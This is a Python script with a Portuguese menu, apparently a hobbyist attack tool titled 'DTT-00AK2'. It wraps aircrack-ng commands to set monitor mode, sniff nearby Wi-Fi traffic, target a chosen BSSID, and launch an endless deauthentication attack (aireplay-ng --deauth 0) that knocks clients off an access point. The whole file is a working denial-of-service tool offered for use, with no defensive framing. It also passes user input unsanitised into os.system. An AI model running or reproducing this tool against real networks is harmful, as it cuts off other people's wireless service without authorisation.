import os

RED = '\033[91m'
YELLOW = '\033[93m'
GREEN = '\033[92m'
RESET = '\033[0m'

def start_monitor_mode():
    os.system("airmon-ng")
    interface = input("Digite aqui qual interface utilizar: ")
    os.system(f"airmon-ng start {interface}")

def analyze_wifi_traffic():
    interface = input(GREEN + "Digite a interface: " + RESET)
    os.system(f'xterm -e airodump-ng "{interface}"')
    os.system('clear')

def filter_results_by_bssid():
    channel = input(GREEN + "Digite o canal: " + RESET)
    bssid = input(GREEN + "Digite a BSSID: " + RESET)
    interface = input(GREEN + "Digite a interface: " + RESET)
    os.system('clear')
    os.system(f'xterm -e airodump-ng -c {channel} --bssid {bssid} {interface}')
    os.system('clear')

def perform_deauthentication_attack():
    bssid = input(GREEN + "Digite a BSSID: " + RESET)
    interface = input(GREEN + "Digite a interface: " + RESET)
    os.system(f'xterm -e aireplay-ng --deauth 0 -a {bssid} {interface}')

while True:
    print(RED + """
             _..---..__
           ,'          `-.
          .'` .          )             DTT-00AK2
          |     `;.__.._.'               V.1.0
           \ .`--.(##)(#).    Wi-Fi deauthentication attack 
            `-->;--' pWq`>              BY:AND3R
              < <"v\,,,,]
               `\`^-''''7
                 `~"--^-'
    """ + RESET)
    print(RED + "1- [airmon-ng] Colocar a interface em modo monitor" + RESET)
    print(YELLOW + "2- [airodump-ng] Analisar o tráfego de redes sem fio" + RESET)
    print(RED + "3- [airodump-ng] Filtrar os resultados pelo BSSID" + RESET)
    print(YELLOW + "4- [aireplay-ng] Realizar ataque no ponto de acesso (AP)" + RESET)
    print(RED + "5- Sair" + RESET)
    
    menu = input(RED + "Digite uma opção >> " + RESET)

    if menu == "1":
        start_monitor_mode()
    elif menu == "2":
        analyze_wifi_traffic()
    elif menu == "3":
        filter_results_by_bssid()
    elif menu == "4":
        perform_deauthentication_attack()
    elif menu == "5":
        break
    else:
        print("Opção inválida")
